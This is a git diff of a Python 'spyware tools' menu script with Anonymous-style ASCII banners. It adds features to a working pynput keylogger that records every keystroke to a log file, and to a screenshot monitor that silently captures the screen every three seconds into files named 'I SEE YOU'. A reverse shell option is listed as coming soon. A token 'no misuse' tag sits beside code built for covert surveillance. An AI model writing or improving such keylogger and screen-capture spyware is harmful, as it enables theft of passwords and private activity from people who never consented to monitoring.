@@ -25,7 +25,7 @@ def logo():
 ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝ 
 ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗
 ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║
-██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║ 친구집에서 쓰세요 악용금지 X
+██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║ 악용금지 X
 ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ spyware tools
           """ + TextColors.RESET)
 
@@ -42,6 +42,10 @@ menu()
 
 select = input(TextColors.GREEN + "anonymous_root:~$ : " + TextColors.RESET)
 
+import os
+import logging
+from pynput.keyboard import Listener
+
 if select in ["1", "KEY LOGGER"]:
     def LogHunter_logo():
         print("""
@@ -52,7 +56,7 @@ if select in ["1", "KEY LOGGER"]:
 ██║  ██╗███████╗   ██║       ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
         """)
-    print("KEY LOGGER START..")
+    print("[*] KEY LOGGER START..")
 
     def setup_logging():
         log_dir = r"C:\Users\USER\Downloads\log"
@@ -64,6 +68,12 @@ if select in ["1", "KEY LOGGER"]:
 
     buffer = []
 
+    min_length = input("[+] ENTER THE LENGTH OF CHARACTERS FOR LOGGING : ")
+    if not min_length.isdigit():
+        min_length = 10  
+    else:
+        min_length = int(min_length)
+
     def on_press(key):
         global buffer
 
@@ -74,7 +84,7 @@ if select in ["1", "KEY LOGGER"]:
         
         buffer.append(key_str)
 
-        if len(''.join(buffer)) >= 5:
+        if len(''.join(buffer)) >= min_length:
             log_str = ''.join(buffer)
             logging.info(log_str)
             print(f"[+] TERMINAL LOG 👀 : {log_str}")
@@ -91,6 +101,7 @@ if select in ["1", "KEY LOGGER"]:
     LogHunter_logo()
     start_keylogger()
 
+
 elif select in ["2", "MONITOR SCREENSHOT"]:
     print("""
 ███████╗████████████╗█████████████████╗   ███████████╗  ██╗██████╗████████╗
@@ -99,8 +110,15 @@ elif select in ["2", "MONITOR SCREENSHOT"]:
 ╚════████║    ██╔══████╔══╝ ██╔══╝ ██║╚██╗██╚════████╔══████║   ██║  ██║  
 ███████╚████████║  ██████████████████║ ╚█████████████║  ██╚██████╔╝  ██║   
 ╚══════╝╚═════╚═╝  ╚═╚══════╚══════╚═╝  ╚═══╚══════╚═╝  ╚═╝╚═════╝   ╚═╝
-    """)
-    print("[+] SCREENSHOT START...")
+""")
+    print("[*] SCREENSHOT START...")
+
+    save_path = input("[+] ENTER THE SCREENSHOT PATH : ")
+    if not save_path:
+        save_path = os.path.join(os.path.expanduser("~"), "Screenshots")
+        
+    if not os.path.exists(save_path):
+        os.makedirs(save_path)
 
     def capture_screenshot(filename):
         screenshot = pyautogui.screenshot()
@@ -108,7 +126,9 @@ elif select in ["2", "MONITOR SCREENSHOT"]:
         print(f"Screenshot saved as {filename}")
 
     def job():
-        capture_screenshot(f"C:\\Users\\USER\\Downloads\\HACKED BY ANONYMOUS{time.strftime('%Y%m%d_%H%M%S')}.png")
+        timestamp = time.strftime('%Y%m%d_%H%M%S')
+        filename = os.path.join(save_path, f"I SEE YOU {timestamp}.png")
+        capture_screenshot(filename)
 
     schedule.every(3).seconds.do(job)
 
@@ -116,8 +136,7 @@ elif select in ["2", "MONITOR SCREENSHOT"]:
         schedule.run_pending()
         time.sleep(1)
 
-
-elif select in ["3" , "REVERSE SHELL"]:
+elif select in ["3", "REVERSE SHELL"]:
     print("COMING SOON...")
     
 
